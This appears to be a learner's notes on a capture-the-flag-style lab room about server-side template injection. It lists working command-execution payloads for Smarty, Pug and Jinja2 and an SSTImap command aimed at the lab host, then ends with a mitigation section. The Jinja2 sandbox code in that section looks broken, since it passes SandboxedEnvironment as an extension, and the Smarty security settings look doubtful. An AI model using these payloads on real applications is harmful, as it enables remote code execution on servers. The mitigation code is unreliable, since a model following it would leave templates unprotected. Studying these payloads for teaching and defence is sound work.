# Server-side Template Injection (SSTI)

---

## TASK 4: PHP - Smarty

Smarty is a PHP template engine that separates presentation from business logic. However, its ability to execute PHP functions within templates can expose applications to SSTI attacks if not securely configured.

### Exploitation

1. Confirm Smarty usage:

```smarty
{'Hello'|upper}  # Returns "HELLO"
```

2. Exploit SSTI:

```smarty
{system("ls")}
```

---

## TASK 5: NodeJS - Pug

Pug (formerly known as Jade) is a template engine for Node.js. Its ability to execute JavaScript directly within templates can pose security risks if user inputs are not properly sanitized.

### Exploitation

To confirm Pug usage, inject a simple payload like:

```pug
#{7*7}  # Returns 49
```

Since Pug allows JavaScript interpolation, use the payload:

```pug
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
```

---

## TASK 6: Python - Jinja2

Jinja2 is a Python template engine widely used in web applications for rendering dynamic content. While it simplifies development, improper handling of user inputs can lead to security risks like SSTI.

### Exploitation

Inject:

```jinja
{{7*7}}  # Returns 49
```

Exploit SSTI:

```jinja
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```

---

## TASK 7: Automating the Exploitation

SSTImap is a tool that automates the process of testing and exploiting SSTI vulnerabilities in various template engines. Hosted on GitHub, it provides a framework for discovering template injection flaws.

### Usage Example

```bash
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

---

## TASK 9: Mitigation

### Jinja2

- Enable sandbox mode to restrict unsafe functions:

```python
from jinja2 import Environment, select_autoescape, sandbox
env = Environment(
        autoescape=select_autoescape(['html', 'xml']),
        extensions=[sandbox.SandboxedEnvironment]
)
```

- Sanitize inputs to remove dangerous characters.
- Regularly audit templates for insecure patterns.

### Pug (Jade)

- Avoid direct JavaScript evaluation in templates. Use safe alternatives like `#{}` for escaping.
- Validate and sanitize user inputs.
- Use secure configuration settings to disable risky features.

### Smarty

- Disable `{php}` tags to prevent PHP code execution:

```php
$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
$smarty->disable_security = false;
```

- Use secure handlers for user-customized templates.
- Regularly review templates and update Smarty for security patches.

---